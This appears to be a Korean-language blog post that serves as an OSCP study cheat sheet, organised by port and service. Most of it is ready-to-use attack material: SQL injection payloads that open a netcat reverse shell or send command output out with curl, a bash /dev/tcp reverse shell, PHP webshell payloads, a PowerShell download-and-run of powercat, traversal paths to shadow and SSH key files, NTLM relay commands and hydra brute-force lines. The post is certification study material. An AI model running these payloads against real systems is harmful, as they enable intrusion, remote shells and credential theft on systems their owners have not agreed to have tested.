---
layout: post
title: OSCPv2
subtitle: OSCPv2 포트별 정리
author: g3rm
categories: 
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
sidebar:
---

# Port Scan
```shell
# basic
sudo nmap -sC -sV -Pn ip -oN ip

# all port 
sudo nmap -sC -sV -Pn -p- ip -oN ip_allport

# udp
sudo nmap -sC -sV -U -Pn ip -oN ip_udp

# nse scan
sudo nmap --script-updatedb
sudo nmap -sC -sV -Pn --script script -p port ip

# In Window
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("ip", $_)) "TCP port $_ is open"} 2>$null
```

# 21 FTP
```shell
# anonymous:anonymous & ftp:ftp
ftp anonymous@ip
```
# 22 SSH
```shell
# Version Vuln Scan
# login
ssh user@ip

# id_rsa login
chmod 600 id_rsa 
ssh -i id_rsa user@ip
```

# 25, 465, 587, 2525 SMTP
```shell
# user 확인
nc -nv <ip> 25

# in Window
Test-NetConnection -Port 25 <ip>

# telnet : admin 권한 필요
dism /online /Enable-Feature /FeatureName:TelnetClient
telnet <IP> 25
```

# 53 DNS
```shell
# IP 찾기
host <domain>

# A레코드 검색
host -t mx <domain>
nslookup mail.megacorptwo.com # in Window

# TXT레코드 검색
host -t txt <domain>
nslookup -type=TXT <domain> <DNS_IP> # in Window

# subdomain 검색 : /usr/share/seclists 
# 없을경우 sudo apt install seclists
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
for ip in $(seq 200 254); do host 000.000.000.$ip; done | grep -v "not found"

# dnsrecon / options : std, brt
dnsrecon -d <domain> -t <options> -D <wordlist>
```

# 80, 443 HTTP
## Basic
```shell
# 호스트 등록
echo "ip domain" | sudo tee -a /etc/hosts

# 무슨 web 인지 찾기 
whatweb http://192.168.50.244

# 웹쉘 위치
/usr/share/webshells/

# 공격 코드 한줄요약
https://jscompress.com/
```
## Gobuster
```shell
# /usr/share/wordlists/dirb, SecLists, dirbuster
# pattern 양식 : {GOBUSTER}/v1
gobuster dir -u <ip> -w <word_list> -p <pattern> -b 301 --timeout 20s

# domain 등록 : 웬만해서는 하고 하자 subdomain 찾기용
echo "ip domain" | sudo tee -a /etc/hosts

# subdomain 찾기
gobuster vhost -u https://mysite.com -w subdomain.txt --append-domain
```

## wpscan
```shell
# wordpress일 경우
# 그 후 나온 plugin cve 서칭
wpscan --url <url> --enumerate ap,u,t --plugins-detection aggressive -o <fileName>

# wp plugin
https://jckhmr.net/create-a-wordpress-webshell-plugin/
wp-contents/plugins/<zip파일명>/<php파일명>
```

## SQL Injection
```
## postgre
### rce
';+CREATE+TABLE+shell(output+text);COPY+shell+FROM+PROGRAM+'rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.45.222+9999+>/tmp/f';--

## MS-SQL
### xp_cmdshell 활성화
; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
### rce
;EXEC xp_cmdshell 'powershell -c "$x = whoami; curl http://my-kali?output=$x"';--

## MySql
### rce
' UNION SELECT 1,2,3,4,"<?php system($_GET['cmd']); ?>",6 INTO DUMPFILE '/var/www/html/shell.php' #
```

## Command Injection
```
# LFI & Linux Command Injection
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali_ip>%2F<port>%200%3E%261%22
bash -c "bash -i >& /dev/tcp/<kali_ip>/<port> 0>&1"

echo -n '<?php echo system($_GET["cmd"]);?>' | base64
data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

php://filter/convert.base64-encode/resource=admin.php
echo "base64" | base64 -d

# Window 일때, cmd, PowerShell 구분 / PetSerAl 검색
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# ps1 다운 후 실행
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.000.000/powercat.ps1");powercat -c 192.168.000.000 -p 4444 -e powershell
```

## Directory Traversal
```shell
# bypass
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216

# linux file
/etc/passwd
/etc/shadow
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/etc/mysql/my.cnf

# window file
c:/Windows/win.ini
c:/windows/system32/license.rtf
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/windows/repair/sam
c:/windows/repair/system
```
## Payload Encoding
```js
// encoding error 방지용 hex 전환
// eval(String.fromCharCode(hexs))
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
# 88 Kerberos

# 161 SNMP
| MIB                    |           |
| ---------------------- | --------- |
| 1.3.6.1.2.1.25.1.6.0   | 시스템 프로세스  |
| 1.3.6.1.2.1.25.4.2.1.2 | 프로그램 실행   |
| 1.3.6.1.2.1.25.4.2.1.4 | 프로세스 경로   |
| 1.3.6.1.2.1.25.2.3.1.4 | 보관 유닛     |
| 1.3.6.1.2.1.25.6.3.1.2 | 소프트웨어 이름  |
| 1.3.6.1.4.1.77.1.2.25  | 사용자 계정    |
| 1.3.6.1.2.1.6.13.1.3   | TCP 로컬 포트 |
```shell
# list 구성
echo "public\nprivate\nmanager" > community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips

# onesixtyone
onesixtyone -c community -i ips

# snmpwalk
snmpwalk -c public -v1 -t 10 <IP> <MIB_Num>

# External node find
snmpwalk -v2c -c public <RHOST> nsExtendObjects snmpwalk -v2c -c public <RHOST> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

# 389 LDAP
```shell
# username으로 Ldapsearch 
ldapsearch -x -H ldap://10.129.192.253 -b 'DC=cascade,DC=local' -D '' -w '' | grep -i r.thompson ldapsearch -x sAMAccountName=r.thompson -H ldap://10.129.192.253 -b 'DC=cascade,DC=local' -D '' -w ''
```

# 445 SMB
```shell
# 디스크 확인
smbclient //<ip>/<Folder 명>
net view \\<AD_domain> /all # in Window

# NTML hash 사용
smbclient \\\\192.168.50.212\\secrets -U <user> --pw-nt-hash <hash>

# 공유 폴더 확인
crackmapexec smb 10.129.157.36 -u '' -p '' --shares
crackmapexec smb 10.129.157.36 -u '' -p '' --users
crackmapexec smb 10.129.157.36 -u '' -p '' --rid-brute

# 재귀로 검색
crackmapexec smb 10.129.157.36 -u '' -p '' --spider <폴더명> --regex .

# 파일 얻기
get file.ext

# writable 확인
## mount
mount -t cifs -o rw,username=guest,password= '//<ip>/<폴더명>' /mnt
## writable.sh
#!/bin/bash
list=$(find /mnt -type d)
for d in $list
do
	touch $d/x 2>/dev/null
	if [ $? -eq 0 ]
	then
		echo $d " is writable"
	fi
done
## scf attack
### hash.scf
[Shell] Command=2
IconFile=\\<kali_ip>\share\pwn.ico 
[Taskbar] 
Command=ToggleDesktop
```

# 1433 MSSQL
```mssql
# mssql 접근 
impacket-mssqlclient admin@10.129.110.72

# DB 조사 
SELECT name FROM sys.databases 

# 테이블 조사 
use database SELECT * FROM INFORMATION_SCHEMA.TABLES 

# 컬럼 조사 
SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Table Name' 

# 데이터 얻기  
SELECT UserName, Email, Password FROM Table_Name
```
# 3306 MYSQL

# 3389 RDP

# 5985, 5986 WINRM
```bash
# key로 login : Sizzle 참고
evil-winrm -S -i ip -u user -p password -c certnew.cer -k private.key
```

# Password Attacks
## Basic
```shell
# 사용할 워드리스트 위치 :  /usr/share/wordlists/
# hash 종류 파악 : hash-identifier / https://md5hashing.net/hash_type_checker
# 각종 rule 위치 : /usr/share/hashcat/rules/

# 특정 앞자리 제거
sed -i '/^1/d' password.txt

# 규칙들 (한줄로 작성 시 한번에 적용 / 여러줄로 작성 시 각각 적용)
$1 -> 뒤에 1 추가 / c -> 앞문자 대문자로

# 규칙 생성 및 적용
echo \$1 > password.rule
hashcat -r demo.rule --stdout password.txt

# base64 
echo -n "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d 
# xxd 
echo -n "6d2424716c5f53405f504073735730726421" | xxd -r -p
```
## hydra
```shell
# user명 알때
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<ip>

# password 알때
hydra -L /usr/share/wordlists/dirb/others/names.txt -p <password> rdp://<ip>

# HTTP Post
hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
"index.php:param1=value1&param2=value2&user=^USER^&pwd=^PASS^&paramn=valn:[F|S]=message"
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.000.000 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# 입력창 뜰 때, A 는 Authorization NTLM 는 Bearer 같은 거
hydra -l sizzler -P /usr/share/wordlists/rockyou.txt 10.129.166.251 http-get '/certsrv:A=NTLM:F=401'
```

## hashcat
```shell
# mode 검색
hashcat --help | grep -i <hash종류>
hashcat -m <mode> <hash값 담긴 파일> <wordlist> -r <rule>.rule

# KeePass
# Database: 지워야함
keepass2john Database.kdbx > keepass.hash 
```

## john
```shell
# rule 양식
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

# rule 변환
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

# ssh
ssh2john id_rsa > ssh.hash

# 사용
john --wordlist=<wordlist> --rules=sshRules ssh.hash
```

## NTLM
```shell
# NTLM hash Relay
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM hash> <user>@<IP>
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM hash> <user>@<IP>

# NTLMv2 hash 얻기
sudo responder -I tap0 # in Kali
dir \\<kali_ip>\test # in reverse Shell

# capture reset
rm /usr/share/responder/Responder.db

# NTLMv2 Relay / one-liner
# Server1 -> kali_SMB server -> Server2 Relay
impacket-ntlmrelayx --no-http-server -smb2support -t <Server2_IP> -c "powershell -enc JABjAGwAaQBlAG4AdA..." # in Kali
dir \\<kali_ip>\test # in Server1 reverse Shell
```

## GPP
```shell
python3 gpp-decrypt.py -f Groups.xml
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

## 
# Windows
## Info
```powershell
# import module
powershell -ep bypass

# Auto
.\winPEAS.exe



```
# Linux
```shell
```

# Tunneling
## ligolo
```bash
```
## SSH
```bash
```
## chisel
```bash
```

# Git
```shell
# git dump 
git-dumper http://siteisup.htb/dev/.git dev
```

# Python

# Jenkins

# Metasploit
## Searchsploit
```shell
# /usr/share/exploitdb
sudo apt update && sudo apt install exploitdb

# searchsploit
searchsploit <검색할 서비스>

# 파일 다운
searchsploit -m <숫자>
```

